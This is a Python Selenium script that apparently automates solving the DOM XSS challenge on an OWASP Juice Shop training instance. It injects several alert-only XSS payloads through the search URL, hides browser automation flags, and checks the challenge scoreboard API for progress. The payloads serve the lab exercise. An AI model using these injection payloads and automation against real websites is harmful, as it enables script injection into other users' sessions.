#!/usr/bin/env python3
"""
Selenium DOM XSS with visible browser
Runs Chrome in visible mode to properly trigger XSS
"""

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException
import time
import requests


def solve_dom_xss_visible():
    """Execute DOM XSS with visible browser"""
    
    print("="*60)
    print("🎯 DOM XSS SOLVER - VISIBLE BROWSER MODE")
    print("="*60)
    
    # Setup Chrome options WITHOUT headless mode
    chrome_options = Options()
    # Remove headless to show browser
    # chrome_options.add_argument("--headless")  # COMMENTED OUT
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--window-size=1280,720")
    
    driver = None
    
    try:
        print("\n1️⃣ Starting Chrome browser (visible mode)...")
        
        # Try Chrome first
        try:
            driver = webdriver.Chrome(options=chrome_options)
            print("   ✅ Chrome browser opened")
        except Exception as e:
            print(f"   ❌ Chrome failed: {str(e)[:50]}")
            print("\n   Trying Firefox...")
            
            # Try Firefox as fallback
            from selenium.webdriver.firefox.options import Options as FirefoxOptions
            firefox_options = FirefoxOptions()
            # Don't use headless for Firefox either
            driver = webdriver.Firefox(options=firefox_options)
            print("   ✅ Firefox browser opened")
        
        base_url = "https://juice3.wonkatech.org"
        
        print("\n2️⃣ Navigating to Juice Shop...")
        driver.get(base_url)
        time.sleep(3)  # Let page fully load
        print("   ✅ Page loaded")
        
        # The winning XSS payload
        payload = '<iframe src="javascript:alert(`xss`)">'
        from urllib.parse import quote
        encoded_payload = quote(payload)
        
        print(f"\n3️⃣ Injecting XSS payload: {payload}")
        
        # Navigate to XSS URL
        xss_url = f"{base_url}/#/search?q={encoded_payload}"
        print(f"   URL: {xss_url[:80]}...")
        
        driver.get(xss_url)
        print("   ✅ Navigated to XSS URL")
        
        # Wait for potential alert
        time.sleep(2)
        
        print("\n4️⃣ Checking for alert...")
        
        # Try to handle alert
        alert_handled = False
        for i in range(5):  # Try 5 times
            try:
                # Check if alert is present
                WebDriverWait(driver, 1).until(EC.alert_is_present())
                alert = driver.switch_to.alert
                alert_text = alert.text
                print(f"   🎉 ALERT DETECTED: '{alert_text}'")
                alert.accept()
                print("   ✅ Alert accepted!")
                alert_handled = True
                break
            except TimeoutException:
                print(f"   Attempt {i+1}: No alert yet...")
                
                # Try alternative payloads
                if i == 1:
                    driver.get(f"{base_url}/#/search?q={quote('<img src=x onerror=alert(`xss`)>')}")
                elif i == 2:
                    driver.get(f"{base_url}/#/search?q={quote('<script>alert(1)</script>')}")
                elif i == 3:
                    # Try direct JavaScript execution
                    try:
                        driver.execute_script("alert('XSS')")
                        print("   ✅ Direct JS execution worked")
                    except:
                        pass
                        
                time.sleep(1)
            except NoAlertPresentException:
                pass
        
        if alert_handled:
            print("\n✅ XSS SUCCESSFULLY TRIGGERED AND HANDLED!")
            time.sleep(3)  # Give time for challenge to register
        else:
            print("\n⚠️ No alert was triggered")
            
            # Last attempt - try to find and click on search result
            print("\n5️⃣ Alternative approach - direct DOM manipulation...")
            try:
                driver.get(f"{base_url}/#/search")
                time.sleep(1)
                
                # Execute JavaScript to inject XSS directly
                driver.execute_script("""
                    var searchResults = document.querySelector('.noResultText') || 
                                       document.querySelector('.search-results') ||
                                       document.querySelector('[ng-if]');
                    if (searchResults) {
                        searchResults.innerHTML = '<img src=x onerror=alert("XSS")>';
                    }
                    // Also try to trigger via search parameter
                    window.location.href = '#/search?q=<iframe src="javascript:alert(1)">';
                """)
                print("   ✅ DOM manipulation executed")
                
                # Check for alert again
                try:
                    WebDriverWait(driver, 2).until(EC.alert_is_present())
                    driver.switch_to.alert.accept()
                    print("   ✅ Alert triggered via DOM manipulation!")
                except:
                    pass
                    
            except Exception as e:
                print(f"   Error: {str(e)[:50]}")
        
        print("\n⏳ Waiting 5 seconds for challenge to register...")
        time.sleep(5)
        
    except UnexpectedAlertPresentException:
        print("   🎉 Unexpected alert - XSS worked!")
        try:
            driver.switch_to.alert.accept()
        except:
            pass
            
    except Exception as e:
        print(f"\n❌ Error: {str(e)}")
        
    finally:
        if driver:
            print("\n6️⃣ Closing browser...")
            driver.quit()
            print("   ✅ Browser closed")
    
    # Check final status
    print("\n" + "="*60)
    print("📊 FINAL STATUS CHECK")
    print("="*60)
    
    session = requests.Session()
    r = session.get(f"https://juice3.wonkatech.org/api/Challenges")
    
    if r.status_code == 200:
        data = r.json()['data']
        dom_xss = [c for c in data if 'DOM' in c.get('name', '') and 'XSS' in c.get('name', '')]
        
        if dom_xss:
            challenge = dom_xss[0]
            if challenge.get('solved'):
                print("🎉 DOM XSS Challenge: SOLVED!")
                print("✅ SUCCESS!")
            else:
                print("⚠️ DOM XSS Challenge: Not yet marked as solved")
                print("\nNote: The challenge may take a moment to register.")
                print("Check again in a few seconds.")
        
        solved = [c for c in data if c.get('solved')]
        print(f"\n📊 Progress: {len(solved)}/110 ({len(solved)*100//110}%)")
        print(f"📌 Need {55-len(solved)} more for 50%")


if __name__ == "__main__":
    print("\n🚀 DOM XSS VISIBLE BROWSER SOLVER")
    print("="*60)
    print("This will open a visible browser window.")
    print("Please don't close it until the script completes.")
    print("="*60)
    
    solve_dom_xss_visible()